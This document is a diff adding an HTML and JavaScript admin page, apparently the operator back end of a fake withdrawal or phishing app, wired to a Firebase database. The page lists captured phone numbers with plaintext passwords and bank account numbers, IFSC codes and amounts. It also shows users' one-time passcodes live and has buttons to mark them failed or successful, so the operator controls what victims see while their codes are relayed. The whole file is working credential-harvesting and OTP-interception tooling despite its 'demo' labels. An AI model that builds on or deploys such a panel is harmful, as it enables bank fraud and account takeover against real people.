@@ -1,0 +1,131 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Withdrawal Admin Panel</title>
+<style>
+*{box-sizing:border-box}body{margin:0;font-family:Inter,Arial,sans-serif;background:linear-gradient(145deg,#f6f3ff,#e8ddff);color:#29243f}
+.wrap{max-width:1100px;margin:auto;padding:28px 16px}.top,.panel{background:rgba(255,255,255,.92);border-radius:24px;box-shadow:0 14px 40px rgba(87,65,160,.12)}
+.top{padding:24px;margin-bottom:18px}.badge{display:inline-block;background:#f0ebff;color:#6e50d8;border-radius:20px;padding:8px 15px;font-weight:800;font-size:12px;letter-spacing:.5px}
+h1{margin:12px 0 5px;font-size:30px}.sub{color:#858096}.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-top:20px}.stat{background:#f8f6ff;border-radius:17px;padding:16px}.stat b{display:block;font-size:27px;margin-top:5px}.actions{display:flex;gap:10px;flex-wrap:wrap;margin-top:18px}
+button{border:0;border-radius:13px;padding:12px 17px;font-weight:800;cursor:pointer}.refresh{background:#7050df;color:#fff}.clear{background:#ffe3e3;color:#a52d2d}
+.panel{padding:18px;margin-bottom:18px}.panel h2{margin:5px 0 15px;font-size:20px}
+.tablewrap{overflow:auto}table{width:100%;border-collapse:collapse;min-width:820px}th,td{text-align:left;padding:13px;border-bottom:1px solid #eee8f7;font-size:13px}th{background:#f7f4ff;color:#6950bb;position:sticky;top:0}.pill{display:inline-block;padding:5px 9px;border-radius:12px;background:#f0ebff;color:#684bd2;font-weight:700}.empty{text-align:center;color:#999;padding:35px}
+.note{font-size:12px;color:#8b8599;margin-top:14px}
+.warning{background:#fff3cd;color:#856404;padding:10px 15px;border-radius:10px;margin-bottom:15px;font-size:13px;border-left:4px solid #ffc107}
+.otp-section{background:#f0f7ff;border-radius:16px;padding:20px;margin-top:15px;border:2px dashed #7050df}
+.otp-section button{width:auto;padding:10px 25px;height:45px;margin-top:0;display:inline-block;border-radius:30px;font-weight:700;border:0;cursor:pointer}
+.otp-actions{display:flex;flex-wrap:wrap;gap:10px;margin-top:12px}
+.btn-failed{background:#dc3545;color:#fff;padding:10px 25px;border-radius:30px;border:0;font-weight:700;cursor:pointer}
+.btn-failed:hover{background:#c82333}
+.btn-success{background:#28a745;color:#fff;padding:10px 25px;border-radius:30px;border:0;font-weight:700;cursor:pointer}
+.btn-success:hover{background:#218838}
+.btn-reset{background:#6c757d;color:#fff;padding:10px 25px;border-radius:30px;border:0;font-weight:700;cursor:pointer}
+.btn-reset:hover{background:#5a6268}
+.btn-cancel{background:#ffc107;color:#000;padding:10px 25px;border-radius:30px;border:0;font-weight:700;cursor:pointer}
+.btn-cancel:hover{background:#e0a800}
+.user-otp-box{background:#e8ddff;border-radius:12px;padding:12px 18px;margin:10px 0;display:flex;align-items:center;gap:15px;flex-wrap:wrap}
+.user-otp-box span{font-weight:700;font-size:18px;color:#7050df;letter-spacing:3px}
+@media(max-width:650px){.stats{grid-template-columns:1fr}.wrap{padding:16px}.top{padding:20px}h1{font-size:25px}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="top">
+    <span class="badge">🛡 ADMIN PANEL • FULL DETAILS</span>
+    <h1>Withdrawal Admin Panel</h1>
+    <div class="sub">Complete activity dashboard — all details visible</div>
+    <div class="warning">⚠️ FULL DETAILS MODE: Phone, Password, Account, IFSC all visible. Keep this page secure!</div>
+    <div class="stats">
+      <div class="stat">Login Activity<b id="loginCount">0</b></div>
+      <div class="stat">Withdrawal Activity<b id="withdrawCount">0</b></div>
+      <div class="stat">Total Activity<b id="totalCount">0</b></div>
+    </div>
+    <div class="actions">
+      <button class="refresh" onclick="render()">↻ Refresh</button>
+      <button class="clear" onclick="clearActivity()">Clear All Demo Activity</button>
+    </div>
+  </div>
+  <div class="panel">
+    <h2>📱 Login Activity</h2>
+    <div class="tablewrap"><table><thead><tr><th>Time</th><th>Platform</th><th>Phone</th><th>Password</th></tr></thead>
+    <tbody id="loginRows"></tbody></table></div>
+  </div>
+  <div class="panel">
+    <h2>🏦 Withdrawal Activity</h2>
+    <div class="tablewrap"><table><thead><tr><th>Time</th><th>Platform</th><th>Bank</th><th>Account</th><th>IFSC</th><th>Amount</th><th>Status</th></tr></thead>
+    <tbody id="withdrawRows"></tbody></table></div>
+    <div class="note">🔓 Full details mode enabled — all data visible for admin purposes.</div>
+  </div>
+  <div class="panel" style="background:rgba(255,255,255,.92);border-radius:24px;padding:20px;margin-top:18px;box-shadow:0 14px 40px rgba(87,65,160,.12)">
+    <h2>🔐 OTP Control Panel</h2>
+    <div class="otp-section">
+      <div id="userOtpDisplay" class="user-otp-box" style="display:none;">
+        <span>📨 User Entered OTP:</span>
+        <span id="userOtpValue">------</span>
+        <span id="userOtpStatus" style="font-size:14px;color:#666;">⏳ Waiting for action...</span>
+      </div>
+      <div style="margin-bottom:10px;font-weight:700;font-size:14px;color:#666;"><span id="otpStatus">✅ Ready</span></div>
+      <div class="otp-actions">
+        <button onclick="cancelTimer()" class="btn-cancel">⏹ Cancel Timer</button>
+        <button onclick="sendOTPFailed()" class="btn-failed">❌ Failed OTP</button>
+        <button onclick="sendOTPSuccess()" class="btn-success">✅ Complete OTP</button>
+        <button onclick="resetOTP()" class="btn-reset">🔄 Reset</button>
+      </div>
+    </div>
+  </div>
+</div>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyBvWHDh7ufJDh7vyXU8MJZ99",
+  authDomain: "withdrawal-app-70402.firebaseapp.com",
+  databaseURL: "https://withdrawal-app-70402-default-rtdb.firebaseio.com",
+  projectId: "withdrawal-app-70402",
+  storageBucket: "withdrawal-app-70402.firebasestorage.app",
+  messagingSenderId: "889103976344",
+  appId: "1:889103976344:web:25aa5c6ba9234e73564ded",
+  measurementId: "G-KKQKXQMKKV"
+};
+firebase.initializeApp(firebaseConfig);
+const database = firebase.database();
+let lastOtp = null;
+
+function render() {
+  database.ref('activities').orderByChild('time').once('value').then((snapshot) => {
+    const data = snapshot.val(); const allData = [];
+    if(data){Object.keys(data).forEach(key=>{allData.push({id:key,...data[key]});});}
+    allData.sort((a,b)=>{if(a.time>b.time)return -1; if(a.time<b.time)return 1; return 0;});
+    renderTable(allData); updateOTPDisplay();
+  }).catch((error)=>{console.error("Firebase Error:",error); document.getElementById('loginRows').innerHTML='<tr><td colspan="4" class="empty">❌ Error loading data</td></tr>'; document.getElementById('withdrawRows').innerHTML='<tr><td colspan="7" class="empty">❌ Error loading data</td></tr>';});
+}
+function renderTable(data) {
+  const logs = data.filter(x=>x.type==="LOGIN"); const withdrawals = data.filter(x=>x.type==="WITHDRAWAL");
+  document.getElementById('loginCount').textContent=logs.length; document.getElementById('withdrawCount').textContent=withdrawals.length; document.getElementById('totalCount').textContent=data.length;
+  const loginRows=document.getElementById('loginRows');
+  if(logs.length){loginRows.innerHTML=logs.map(x=>'<tr><td>'+esc(x.time)+'</td><td><span class="pill">'+esc(x.platform)+'</span></td><td><strong>'+esc(x.phone)+'</strong></td><td><strong>'+esc(x.password)+'</strong></td></tr>').join('');}
+  else{loginRows.innerHTML='<tr><td colspan="4" class="empty">No demo activity yet.</td></tr>';}
+  const withdrawRows=document.getElementById('withdrawRows');
+  if(withdrawals.length){withdrawRows.innerHTML=withdrawals.map(x=>{var statusClass='',statusText='⏳ Pending'; if(x.verified===true){statusClass='style="background:#28a745;color:#fff;"';statusText='✅ Verified';}else if(x.otpFailed===true){statusClass='style="background:#dc3545;color:#fff;"';statusText='❌ Failed';} return '<tr><td>'+esc(x.time)+'</td><td>'+esc(x.platform)+'</td><td><strong>'+esc(x.bank)+'</strong></td><td><strong>'+esc(x.account)+'</strong></td><td><strong>'+esc(x.ifsc)+'</strong></td><td><strong>'+esc(x.amount)+'</strong></td><td><span class="pill" '+statusClass+'>'+statusText+'</span></td></tr>';}).join('');}
+  else{withdrawRows.innerHTML='<tr><td colspan="7" class="empty">No demo activity yet.</td></tr>';}
+}
+function esc(v){return String(v??"").replace(/[&<>"']/g,m=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#039;"}[m]));}
+function updateOTPDisplay() {
+  const userOtp = localStorage.getItem('user_entered_otp'); const retryMode = localStorage.getItem('otp_retry_mode');
+  if(retryMode==='true'){document.getElementById('userOtpDisplay').style.display='flex'; document.getElementById('userOtpValue').textContent='⏳ Waiting for new OTP...'; document.getElementById('userOtpStatus').textContent='🔄 User is retrying...'; document.getElementById('userOtpStatus').style.color='#ff9800'; document.getElementById('otpStatus').textContent='🔄 Waiting for user to enter new OTP...'; document.getElementById('otpStatus').style.color='#ff9800';}
+  else if(userOtp && userOtp!==lastOtp){lastOtp=userOtp; document.getElementById('userOtpDisplay').style.display='flex'; document.getElementById('userOtpValue').textContent=userOtp; document.getElementById('userOtpStatus').textContent='⏳ Waiting for admin action...'; document.getElementById('userOtpStatus').style.color='#ff9800'; document.getElementById('otpStatus').textContent='📨 OTP received from user! Take action.'; document.getElementById('otpStatus').style.color='#ff9800';}
+  const result=localStorage.getItem('otp_result');
+  if(result==='failed'){document.getElementById('otpStatus').textContent='❌ OTP Failed! User notified.'; document.getElementById('otpStatus').style.color='#dc3545'; document.getElementById('userOtpStatus').textContent='❌ OTP Failed!'; document.getElementById('userOtpStatus').style.color='#dc3545';}
+  else if(result==='success'){document.getElementById('otpStatus').textContent='✅ OTP Successful! User notified.'; document.getElementById('otpStatus').style.color='#28a745'; document.getElementById('userOtpStatus').textContent='✅ OTP Successful!'; document.getElementById('userOtpStatus').style.color='#28a745';}
+}
+function clearActivity(){if(confirm("Clear all demo activity?")){database.ref('activities').remove().then(()=>{localStorage.removeItem('user_entered_otp');localStorage.removeItem('otp_result');localStorage.removeItem('withdrawal_timer_cancel');localStorage.removeItem('otp_retry_mode');render();});}}
+function cancelTimer(){localStorage.setItem('withdrawal_timer_cancel','true'); document.getElementById('otpStatus').textContent='⏹ Timer cancelled! User can enter OTP.'; document.getElementById('otpStatus').style.color='#dc3545';}
+function sendOTPFailed(){const userOtp=localStorage.getItem('user_entered_otp'); if(!userOtp){alert('No OTP entered by user yet!');return;} database.ref('activities').once('value').then((snapshot)=>{const data=snapshot.val(); if(data){const keys=Object.keys(data); const latestKey=keys[keys.length-1]; if(latestKey&&data[latestKey].type==='WITHDRAWAL'){database.ref('activities/'+latestKey).update({verified:false,otpFailed:true});}}}); localStorage.setItem('otp_result','failed'); document.getElementById('userOtpStatus').textContent='❌ OTP Failed!'; document.getElementById('userOtpStatus').style.color='#dc3545'; document.getElementById('otpStatus').textContent='❌ OTP Failed! User notified.'; document.getElementById('otpStatus').style.color='#dc3545'; render();}
+function sendOTPSuccess(){const userOtp=localStorage.getItem('user_entered_otp'); if(!userOtp){alert('No OTP entered by user yet!');return;} database.ref('activities').once('value').then((snapshot)=>{const data=snapshot.val(); if(data){const keys=Object.keys(data); const latestKey=keys[keys.length-1]; if(latestKey&&data[latestKey].type==='WITHDRAWAL'){database.ref('activities/'+latestKey).update({verified:true,otpFailed:false});}}}); localStorage.setItem('otp_result','success'); document.getElementById('userOtpStatus').textContent='✅ OTP Successful!'; document.getElementById('userOtpStatus').style.color='#28a745'; document.getElementById('otpStatus').textContent='✅ OTP Successful! User notified.'; document.getElementById('otpStatus').style.color='#28a745'; render();}
+function resetOTP(){localStorage.removeItem('user_entered_otp'); localStorage.removeItem('otp_result'); localStorage.removeItem('withdrawal_timer_cancel'); localStorage.removeItem('otp_retry_mode'); lastOtp=null; document.getElementById('userOtpDisplay').style.display='none'; document.getElementById('userOtpValue').textContent='------'; document.getElementById('userOtpStatus').textContent='⏳ Waiting for action...'; document.getElementById('userOtpStatus').style.color='#666'; document.getElementById('otpStatus').textContent='✅ Reset. Ready.'; document.getElementById('otpStatus').style.color='#28a745'; render();}
+render(); setInterval(render, 3000);
+</script>
+</body>
+</html>
